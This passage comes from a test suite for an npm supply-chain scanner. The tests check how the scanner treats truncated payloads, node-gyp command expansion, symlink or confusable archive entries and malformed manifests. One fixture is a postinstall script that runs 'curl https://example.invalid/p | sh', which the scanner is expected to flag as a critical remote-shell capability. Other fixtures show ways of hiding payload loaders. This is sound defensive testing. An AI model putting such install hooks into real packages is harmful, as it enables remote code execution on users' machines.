        file("package.json", JSON.stringify(manifest)),
        file("install.js", "require('./payload.' + 'map')"),
        {
          path: "payload.map",
          size: 4096,
          sha256: "skipped-dynamic-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-truncated",
      resolvedVersion: "1.0.0",
      fileCount: 3,
    });
  });

  test.each([
    ["an aliased loader", "const load = require; load('./payload.min.js')"],
    ["a child process", 'require("child_process").execFileSync("./payload.min.js")'],
  ])("a skipped payload reached by %s is uninspectable", async (_kind, installSource) => {
    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
    const manifest = {
      name: "clipped",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const archive = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", installSource),
        {
          path: "payload.min.js",
          size: 4096,
          sha256: "skipped-executed-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-truncated",
      resolvedVersion: "1.0.0",
      fileCount: 3,
    });
  });

  test("a skipped script invoked by implicit node-gyp is uninspectable", async () => {
    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
    const manifest = {
      name: "clipped",
      version: "1.0.0",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    };
    const archive = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        file("binding.gyp", '{"variables":{"generated":"<!(node install.min.js)"}}'),
        {
          path: "install.min.js",
          size: 4096,
          sha256: "skipped-gyp-action",
          flags: ["text-sample-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-truncated",
      resolvedVersion: "1.0.0",
      fileCount: 3,
    });
  });

  test("an unrelated skipped source map does not invalidate complete install evidence", async () => {
    const url = "https://registry.npmjs.org/complete/-/complete-1.0.0.tgz";
    const manifest = {
      name: "complete",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const archive = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", "console.log('installed');"),
        {
          path: "dist/index.js.map",
          size: 4096,
          sha256: "skipped-map",
          flags: ["text-sample-skipped"],
        },
      ],
      packageJson: manifest,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { complete: packument("complete", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { complete: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "inspected",
      observation: { execution: "observed", risk: "not-observed" },
      resolvedVersion: "1.0.0",
      fileCount: 3,
    });
  });

  test.each([
    ["duplicate", "duplicate path; later entry replaced earlier entry"],
    ["unicode-confusable", "path contained visually-confusable characters"],
    ["non-regular", "symbolic link (symlink)"],
  ])("a dependency archive with a %s entry is uninspectable", async (kind, detail) => {
    const url = "https://registry.npmjs.org/ambiguous/-/ambiguous-1.0.0.tgz";
    const archive = {
      files: [file("package.json", JSON.stringify({ name: "ambiguous", version: "1.0.0" }))],
      packageJson: { name: "ambiguous", version: "1.0.0" },
      suspiciousEntries: [{ kind, path: "install.js", detail }],
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { ambiguous: packument("ambiguous", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { ambiguous: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-ambiguous",
      reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
    });
  });

  test("archive ambiguity preserves install risk proven by readable bytes", async () => {
    const url = "https://registry.npmjs.org/ambiguous/-/ambiguous-1.0.0.tgz";
    const manifest = {
      name: "ambiguous",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const archive = {
      files: [
        file("package.json", JSON.stringify(manifest)),
        file(
          "install.js",
          'require("node:child_process").execSync("curl https://example.invalid/p | sh")',
        ),
      ],
      packageJson: manifest,
      suspiciousEntries: [
        { kind: "non-regular", path: "unrelated", detail: "symbolic link (symlink)" },
      ],
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { ambiguous: packument("ambiguous", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { ambiguous: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-ambiguous",
      observation: { execution: "observed", risk: "observed" },
    });
    expect(review.dependencies[0].installReachableCapabilities).toContain("code.remote-shell");
    expect(review.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dependency.install-time-capability",
          severity: "critical",
        }),
      ]),
    );
  });

  test("an explicit directory entry does not invalidate an otherwise complete archive", async () => {
    const url = "https://registry.npmjs.org/directory/-/directory-1.0.0.tgz";
    const archive = {
      files: [file("package.json", JSON.stringify({ name: "directory", version: "1.0.0" }))],
      packageJson: { name: "directory", version: "1.0.0" },
      suspiciousEntries: [{ kind: "non-regular", path: "lib", detail: "type 5 (directory)" }],
    };
    const review = await inspect(
      brokerStub({
        metadata: { directory: packument("directory", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { directory: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({ status: "inspected", reason: null });
  });

  test("a dependency without a readable root manifest is uninspectable", async () => {
    const url = "https://registry.npmjs.org/broken/-/broken-1.0.0.tgz";
    const malformed = '{"name":"broken","scripts":{"postinstall":"node install.js",}}';
    const archive = {
      files: [file("package.json", malformed), file("install.js", "console.log('install')")],
      packageJson: null,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { broken: packument("broken", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { broken: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "manifest-unavailable",
      reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
      automaticExecution: [],
    });
  });
});

test.each([
  ["staged-publish", npmAdapter],
  ["workflow-gate", npmGateAdapter],
])("the %s npm adapter inspects embedded dependency bytes", (_surface, adapter) => {
  expect(adapter.inspectEmbeddedAddedDependencies).toBeTypeOf("function");
});

describe("inspectBundledNpmDependenciesForAdapter", () => {
  test.each([
    ["mismatched", '{"name":"different","version":"1.0.0"}'],
    ["malformed", '{"name":"embedded",'],
  ])("a bundled child with a %s manifest fails visibly in place", (_kind, packageJson) => {
    const stagedManifest = {
      name: "parent",
      version: "1.0.1",
      dependencies: { embedded: "1.0.0" },
      bundleDependencies: ["embedded"],
    };
    const review = inspectBundledNpmDependenciesForAdapter({
      manifestDiff: summarizePackageJsonDiff({ name: "parent", version: "1.0.0" }, stagedManifest),
      baselineManifestUnavailable: false,
      stagedManifest,
      stagedFiles: [file("node_modules/embedded/package.json", packageJson)],
    });

    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
    });
    expect(review.dependencies[0]).toMatchObject({
      name: "embedded",
      status: "uninspectable",
      reason: "manifest-unavailable",
      registryHost: null,
    });
  });

  test.each(["node_modules/embedded/install.js", "node_modules/embedded"])(
    "a suspicious entry at %s makes its bundled child evidence uninspectable",
    (suspiciousPath) => {
      const stagedManifest = {
        name: "parent",
        version: "1.0.1",
        dependencies: { embedded: "1.0.0" },
        bundleDependencies: ["embedded"],
      };
      const stagedFiles = [
        file("package.json", JSON.stringify(stagedManifest)),
        file(
          "node_modules/embedded/package.json",
          JSON.stringify({ name: "embedded", version: "1.0.0" }),
        ),
      ];

      const review = inspectBundledNpmDependenciesForAdapter({
        manifestDiff: summarizePackageJsonDiff(
          { name: "parent", version: "1.0.0" },
          stagedManifest,
        ),
        baselineManifestUnavailable: false,
        stagedManifest,
        stagedFiles,
        stagedSuspiciousEntries: [
          {
            kind: "non-regular",
            path: suspiciousPath,
            detail: "symbolic link (symlink)",
          },
        ],
      });

      expect(review).toMatchObject({
        status: "partial",
        selectedCount: 1,
        inspectedCount: 0,
        uninspectableCount: 1,
      });
      expect(review.dependencies[0]).toMatchObject({
        status: "uninspectable",
        reason: "artifact-ambiguous",
      });
    },
  );
});
